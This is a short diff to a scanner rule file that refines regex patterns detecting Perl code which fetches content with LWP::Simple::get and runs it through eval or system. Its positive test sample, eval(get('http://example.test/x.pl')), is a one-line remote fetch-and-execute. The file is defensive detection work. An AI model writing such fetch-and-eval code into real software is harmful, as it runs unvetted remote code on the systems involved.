@@ -166,9 +166,9 @@ rules:
     match:
       kind: regex
       patterns:
-        - '\beval\s*\(?\s*(?:LWP::Simple::)?get\s*\(\s*["''$]'
+        - '\beval\s*(?:\(\s*)?(?:LWP::Simple::)?get\s*\(\s*["''$]'
         - '\beval\s*\(?\s*\$\w+\s*->\s*(?:get|request)\s*\([^)\n]{0,120}\)\s*->\s*(?:content|decoded_content)'
-        - '\bsystem\s*\(?\s*(?:LWP::Simple::)?get\s*\('
+        - '\bsystem\s*(?:\(\s*)?(?:LWP::Simple::)?get\s*\('
     tests:
       positive:
         - "eval(get('http://example.test/x.pl'));"
